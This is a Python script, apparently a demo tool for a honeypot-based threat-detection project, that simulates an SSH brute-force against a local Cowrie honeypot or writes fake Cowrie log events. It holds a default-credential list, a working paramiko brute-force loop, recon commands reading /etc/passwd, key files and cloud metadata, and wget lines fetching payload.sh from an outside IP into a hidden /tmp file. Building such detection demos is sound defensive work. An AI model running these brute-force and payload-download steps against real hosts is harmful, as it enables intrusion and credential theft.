#!/usr/bin/env python3
"""
SPECTER Demo — Attacker Simulator
Mimics a realistic SSH brute-force + C2 beacon scenario against
your local Cowrie honeypot for demo/presentation purposes.

Usage:
    pip install paramiko
    python scripts/simulate_attack.py                  # full attack sequence
    python scripts/simulate_attack.py --quick          # fast version for demo
    python scripts/simulate_attack.py --port 2222      # default cowrie port

What it does:
    1. Brute-forces SSH with common credential pairs (Cowrie logs all attempts)
    2. On "success" (Cowrie always accepts eventually), runs recon commands
    3. Tries to download a fake payload (Cowrie logs the URL)
    4. All of this gets ingested into SPECTER in real time

SPECTER then:
    → Flags your attacker IP as CRITICAL
    → Maps TTPs: T1110 (Brute Force), T1059 (Command Exec), T1105 (Transfer)
    → Fires Discord alert with AI executive summary
    → Shows attacker IP in graph connected to TTPs
"""
import sys
import time
import random
import socket
import argparse
from datetime import datetime

# Try to import paramiko for real SSH simulation
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("⚠  paramiko not installed. Running log-injection mode instead.")
    print("   Install with: pip install paramiko")
    print()

# ── Config ─────────────────────────────────────────────────────────────────────

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 2222

# Common creds attackers actually use (safe to include — these are public knowledge)
CRED_PAIRS = [
    ("root", "root"), ("admin", "admin"), ("root", "123456"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("admin", "password"),
    ("root", "toor"), ("user", "user"), ("test", "test"),
    ("root", "admin"), ("guest", "guest"), ("root", ""),
]

# Commands a real attacker would run after gaining access
RECON_COMMANDS = [
    "uname -a",
    "id",
    "whoami",
    "cat /etc/passwd",
    "ps aux",
    "netstat -an",
    "ifconfig",
    "ip addr",
    "cat /proc/cpuinfo | grep 'model name' | head -1",
    "ls /home",
    "find / -name '*.key' 2>/dev/null | head -5",
    "curl -s http://169.254.169.254/latest/meta-data/",   # AWS metadata probe
    "wget -q http://45.227.254.124/payload.sh -O /tmp/.x && chmod +x /tmp/.x",
]

RED   = "\033[91m"
YLW   = "\033[93m"
GRN   = "\033[92m"
CYN   = "\033[96m"
DIM   = "\033[2m"
RESET = "\033[0m"
BOLD  = "\033[1m"


def banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════╗
║        SPECTER — ATTACKER SIMULATOR               ║
║        FOR DEMO/PRESENTATION USE ONLY             ║
╚═══════════════════════════════════════════════════╝{RESET}
""")


def log(msg, color=DIM, prefix="  "):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{DIM}[{ts}]{RESET} {prefix}{color}{msg}{RESET}")


def simulate_with_paramiko(host: str, port: int, quick: bool):
    """Real SSH connection simulation — Cowrie sees actual SSH traffic."""
    log(f"Target: {host}:{port}", YLW, "→ ")
    log("Starting SSH brute-force sequence...", YLW, "→ ")
    print()

    # Phase 1: Brute force
    print(f"{BOLD}[PHASE 1] Credential Brute Force{RESET}")
    creds = CRED_PAIRS[:4] if quick else CRED_PAIRS
    success_creds = None

    for user, passwd in creds:
        log(f"Trying {user}:{passwd}", DIM)
        time.sleep(0.3 if quick else random.uniform(0.5, 2.0))

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host, port=port,
                username=user, password=passwd,
                timeout=5, banner_timeout=5,
                allow_agent=False, look_for_keys=False,
            )
            # Cowrie accepts everything eventually — this "works"
            log(f"✓ Connected with {user}:{passwd}", GRN)
            success_creds = (user, passwd, client)
            break
        except paramiko.AuthenticationException:
            log(f"✗ Failed: {user}:{passwd}", RED)
        except Exception as e:
            log(f"✗ Error: {e}", RED)
            break

    if not success_creds:
        log("Could not connect to Cowrie. Is it running? docker-compose ps", RED, "✗ ")
        return

    user, passwd, client = success_creds
    time.sleep(1)

    # Phase 2: Recon
    print()
    print(f"{BOLD}[PHASE 2] Post-Exploitation Recon{RESET}")
    cmds = RECON_COMMANDS[:3] if quick else RECON_COMMANDS[:7]

    try:
        shell = client.invoke_shell()
        time.sleep(0.5)

        for cmd in cmds:
            log(f"$ {cmd}", CYN)
            shell.send(cmd + "\n")
            time.sleep(0.8 if quick else random.uniform(1, 2.5))
            if shell.recv_ready():
                out = shell.recv(4096).decode("utf-8", errors="ignore")
                for line in out.strip().split("\n")[:3]:
                    if line.strip():
                        log(line.strip(), DIM, "    ")

        # Phase 3: Payload download attempt
        print()
        print(f"{BOLD}[PHASE 3] Payload Download{RESET}")
        payload_cmd = "wget -q http://45.227.254.124/payload.sh -O /tmp/.update"
        log(f"$ {payload_cmd}", RED)
        shell.send(payload_cmd + "\n")
        time.sleep(2)

        client.close()
    except Exception as e:
        log(f"Shell error: {e}", RED)

    print()
    log("Attack sequence complete.", GRN, "✓ ")
    log("Check SPECTER Dashboard — attacker IP should appear as CRITICAL", GRN, "→ ")
    log("Check Discord for the real-time alert with AI summary", GRN, "→ ")


def simulate_log_injection(cowrie_log_path: str, quick: bool):
    """
    Fallback: directly write realistic Cowrie-format events into the log file.
    Use this if paramiko is not installed or Cowrie isn't accessible.
    The cowrie_watcher service picks these up and ingests them.
    """
    import json
    from pathlib import Path

    log_path = Path(cowrie_log_path)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Simulate attacker from a realistic-looking IP
    attacker_ip = f"45.{random.randint(200,255)}.{random.randint(100,200)}.{random.randint(1,254)}"
    session_id  = f"specter{random.randint(10000000, 99999999)}"
    ts          = datetime.utcnow().isoformat() + "Z"

    print(f"{BOLD}[LOG INJECTION MODE]{RESET}")
    log(f"Simulated attacker IP: {attacker_ip}", YLW)
    log(f"Writing events to: {log_path}", YLW)
    print()

    events = [
        # Login attempts
        *[{
            "eventid": "cowrie.login.failed",
            "timestamp": ts,
            "src_ip": attacker_ip,
            "session": session_id,
            "username": u, "password": p,
            "sensor": "specter-demo",
        } for u, p in (CRED_PAIRS[:3] if quick else CRED_PAIRS[:6])],
        # Successful login
        {
            "eventid": "cowrie.login.success",
            "timestamp": ts,
            "src_ip": attacker_ip,
            "session": session_id,
            "username": "root", "password": "admin",
        },
        # Commands
        *[{
            "eventid": "cowrie.command.input",
            "timestamp": ts,
            "src_ip": attacker_ip,
            "session": session_id,
            "input": cmd,
        } for cmd in (RECON_COMMANDS[:3] if quick else RECON_COMMANDS[:6])],
        # File download
        {
            "eventid": "cowrie.session.file_download",
            "timestamp": ts,
            "src_ip": attacker_ip,
            "session": session_id,
            "url": "http://45.227.254.124/payload.sh",
            "outfile": "/tmp/.update",
        },
    ]

    delay = 0.2 if quick else 1.0
    with open(log_path, "a") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")
            f.flush()
            log(f"→ {event['eventid']}", CYN)
            time.sleep(delay)

    print()
    log(f"✓ Injected {len(events)} events as attacker {attacker_ip}", GRN, "✓ ")
    log("cowrie_watcher will pick these up in ~5 seconds", GRN, "→ ")
    log("Check SPECTER Dashboard for the new CRITICAL indicator", GRN, "→ ")


def main():
    parser = argparse.ArgumentParser(description="SPECTER Attacker Simulator")
    parser.add_argument("--host",     default=DEFAULT_HOST)
    parser.add_argument("--port",     type=int, default=DEFAULT_PORT)
    parser.add_argument("--quick",    action="store_true", help="Fast mode for live demo")
    parser.add_argument("--inject",   action="store_true", help="Use log injection instead of real SSH")
    parser.add_argument("--log-path", default="./cowrie_logs/cowrie.json",
                        help="Path to cowrie.json for injection mode")
    args = parser.parse_args()

    banner()

    if args.inject or not HAS_PARAMIKO:
        simulate_log_injection(args.log_path, args.quick)
    else:
        simulate_with_paramiko(args.host, args.port, args.quick)


if __name__ == "__main__":
    main()
